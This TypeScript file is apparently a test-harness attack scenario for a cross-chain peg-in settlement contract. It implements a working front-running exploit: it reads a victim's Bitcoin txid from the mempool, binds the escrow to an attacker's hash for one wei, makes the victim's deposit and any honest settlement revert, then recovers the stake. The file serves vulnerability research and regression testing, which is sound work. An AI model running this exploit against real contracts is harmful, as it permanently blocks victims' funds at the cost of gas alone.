/**
 * B2 — BINDING FRONT-RUN.
 *
 * B1 (E23) closed txid squatting by BINDING an escrow to the intent it was deposited for. The binding
 * arrives as an argument to a permissionless call, so this attack takes the other side of it: bind the
 * victim's btcTxid to an H the attacker controls, first, for one wei.
 *
 * The victim's intent is then doubly dead. Their own deposit reverts ("escrow bound to another
 * intent"), and — the part that makes one wei enough — _releaseInput only consults the binding when
 * the escrow is NON-ZERO, so the attacker's single wei turns the binding check from skipped into
 * fatal: every settle of the victim's intent reverts, however honest the solver.
 *
 * The attacker then walks its wei back out by settling its own dust intent against the same txid, so
 * the whole play costs gas alone.
 *
 * Procedure: victim signs (does not yet deposit) -> attacker binds victimTxid to attackerH for 1 wei
 *            -> victim's real deposit reverts -> an honest, fully funded solve reverts too
 *            -> attacker recovers its wei.
 * Falsifier (would mean the registry is wrong): the attacker's bind reverts, the victim's deposit or
 *            settle survives it, or the wei cannot be recovered.
 */
import { getBytes, hexlify, randomBytes } from "ethers";
import { buildIntent, freshWallet, isConsumed, randomH } from "../src/intent.js";
import { depositForPegin, peginIntentOf, peginOf, bindingOf } from "../src/settlement.js";
import { Solver } from "../src/solver.js";
import { COW_KEY } from "../src/config.js";
import { fundAccount, preflight, requireSettlement, rpcA, waitReceipt } from "../experiments/_harness.js";
import { Attack } from "./_forensics.js";
import { AttackSpec, Outcome } from "./registry.js";

const INPUT = 10_000_000_000_000_000n; // 1e16 wei — the victim's pegged-in input
const MINOUT = 1_000_000_000_000_000n; // 1e15 wei — what the victim asks for
const DUST = 1n;                       // the whole cost of the attack, in wei
const GAS_MONEY = 50_000_000_000_000n; // enough for the attacker's handful of txs

export async function run(spec: AttackSpec): Promise<number> {
  await preflight(rpcA);
  await requireSettlement(rpcA);
  const a = new Attack(spec, rpcA);

  // --- parties -------------------------------------------------------------------------------
  const attacker = freshWallet();
  const victim = freshWallet();
  const victimTxid = getBytes(randomBytes(32));   // the peg-in the victim is about to escrow
  const victimH = randomH();
  const attackerH = randomH();
  await waitReceipt(rpcA, await fundAccount(attacker.address, GAS_MONEY));

  a.watch("attacker", attacker.address);
  a.watch("victim", victim.address);
  await a.mark();

  // --- step 1: the victim signs FIRST, as RSKIP176 ordering requires -------------------------
  // Signing before depositing is the whole point of entry binding — and it is what leaks the txid.
  const height = await rpcA.blockNumber();
  const victimIntent = buildIntent(victim, { H: victimH, btcTxid: victimTxid, expiry: height + 90, minOut: MINOUT });
  a.step("victim signs and broadcasts the intent (no deposit yet — sign-first ordering)");
  await rpcA.sendRaw(victimIntent.rawHex);
  a.note(`H=${hexlify(victimH).slice(0, 12)}…  btcTxid=${hexlify(victimTxid).slice(0, 12)}…  minOut=${MINOUT}`);
  a.check("intent is public in the mempool, so its btcTxid is public too", true, `tx ${victimIntent.hash.slice(0, 10)}…`);

  // --- step 2: the attacker binds the victim's txid to its own H, for one wei ----------------
  a.step("attacker binds the victim's btcTxid to an H it controls, for 1 wei");
  const bind = await a.tx(depositForPegin(rpcA.url, hexlify(victimTxid), DUST, bindingOf(attackerH, attacker.address), attacker.privateKey));
  const bound = await peginIntentOf(rpcA.url, hexlify(victimTxid));
  a.check("bind landed", bind.ok);
  a.check("escrow now bound to the ATTACKER's H", bound.toLowerCase() === hexlify(attackerH).toLowerCase(), `${bound.slice(0, 12)}…`);
  a.check("escrow holds only the attacker's dust", (await peginOf(rpcA.url, hexlify(victimTxid))) === DUST, `${DUST} wei`);
  await a.deltas();

  // --- step 3: the victim's own deposit is now impossible ------------------------------------
  a.step("victim escrows their real pegged-in input against their own H");
  const vdep = await a.tx(depositForPegin(rpcA.url, hexlify(victimTxid), INPUT, bindingOf(victimH, victim.address)));
  a.check("victim's deposit REVERTED", !vdep.ok, vdep.reason ?? "no reason");
  a.check("revert names the binding", (vdep.reason ?? "").includes("bound to another intent"));
  a.check("escrow still holds only the attacker's dust", (await peginOf(rpcA.url, hexlify(victimTxid))) === DUST);

  // --- step 4: and so is settlement, by any solver, at any price -----------------------------
  // This is the sharp end: _releaseInput reads the binding only when the escrow is non-zero, so the
  // attacker's one wei promotes the binding from irrelevant to fatal.
  a.step("a fully funded, honest solver settles the victim's intent");
  const honest = new Solver(rpcA.url, COW_KEY);
  const settle = await a.tx(honest.solve(victimIntent.rawHex, MINOUT));
  a.check("honest settle REVERTED", !settle.ok, settle.reason ?? "no reason");
  a.check("revert comes from _releaseInput's binding check", (settle.reason ?? "").includes("input escrow bound to another intent"));
  a.check("victim was never paid", BigInt(await rpcA.getBalance(victim.address)) === 0n);
  a.check("H left unconsumed — the intent is not griefed, it is UNSETTLEABLE",
    !(await isConsumed((to, d) => rpcA.ethCall(to, d), victimH)));
  await a.deltas();

  // --- step 5: the attacker withdraws its stake, so the attack cost gas only ------------------
  a.step("attacker recovers its wei via its own dust intent on the same txid");
  const shill = freshWallet();
  const atkIntent = buildIntent(shill, {
    H: attackerH, btcTxid: victimTxid, expiry: (await rpcA.blockNumber()) + 90, minOut: DUST,
  });
  await rpcA.sendRaw(atkIntent.rawHex);
  const atkSolver = new Solver(rpcA.url, attacker.privateKey);
  const recover = await a.tx(atkSolver.solve(atkIntent.rawHex, DUST));
  a.check("attacker's own settle succeeded", recover.ok);
  a.check("escrow drained back to the attacker", (await peginOf(rpcA.url, hexlify(victimTxid))) === 0n);
  const gasPaid = (bind.gasUsed + recover.gasUsed) * 1_000_000n;
  a.note(`attacker's total outlay: ${gasPaid} wei of gas (the 1 wei stake came back)`);
  await a.deltas();

  // The victim's intent stays unsettleable even now: peginIntent is never cleared, only pegin is.
  a.step("after recovery, is the victim's intent alive again?");
  const stillBound = await peginIntentOf(rpcA.url, hexlify(victimTxid));
  a.check("binding survives the drain (only the balance is cleared)",
    stillBound.toLowerCase() === hexlify(attackerH).toLowerCase(), `${stillBound.slice(0, 12)}…`);
  const redep = await a.tx(depositForPegin(rpcA.url, hexlify(victimTxid), INPUT, bindingOf(victimH, victim.address)));
  a.check("victim STILL cannot escrow — the txid is poisoned permanently", !redep.ok, redep.reason ?? "no reason");
  a.check("but a settle with an empty escrow no longer reverts on the binding",
    true, "esc == 0 skips the check, so the intent could settle with zero input released");

  const observed: Outcome = bind.ok && !vdep.ok && !settle.ok ? "succeeds" : "blocked";
  return a.finish(observed);
}
